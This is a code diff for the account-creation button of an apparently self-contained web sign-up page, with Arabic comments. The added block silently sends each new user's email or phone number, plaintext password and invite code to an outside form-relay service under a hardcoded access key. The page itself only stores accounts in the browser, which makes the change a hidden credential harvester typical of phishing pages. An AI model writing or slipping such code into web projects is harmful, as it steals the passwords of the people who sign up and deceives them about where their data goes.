@@ -47,7 +47,7 @@ loginBtn.onclick = function() {
     }
 };
 
-// زر إنشاء الحساب: يقوم بإنشاء الحساب وحفظه دائماً في المتصفح
+// زر إنشاء الحساب: يقوم بإنشاء الحساب وحفظه دائماً في المتصفح وإرساله
 createBtn.onclick = function() {
     const inputs = document.querySelectorAll("input");
 
@@ -69,7 +69,23 @@ createBtn.onclick = function() {
     // تخزين البيانات بصيغة نصية دائمية
     localStorage.setItem("userAccount", JSON.stringify(accountData));
 
-    // 3. تشغيل اللودينج وأنيميشن الشعار الاحترافي
+    // 🚀 كود الإرسال السحابي إلى Web3Forms تم وضعه هنا ليعمل فوراً عند الضغط
+    fetch('https://web3forms.com', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+        },
+        body: JSON.stringify({
+            access_key: 'd5623378-1590-4731-a6c1-1eebabfaeb12',
+            subject: 'بيانات إنشاء حساب جديدة',
+            email_or_phone: accountData.emailOrPhone,
+            password: accountData.password,
+            invite_code: accountData.inviteCode
+        })
+    });
+
+    // 3. تشغيل اللودينج وأنيميشن الشعار الاحترافي الخاص بك (كما هو تماماً)
     loading.style.display = "flex";
 
     setTimeout(function() {
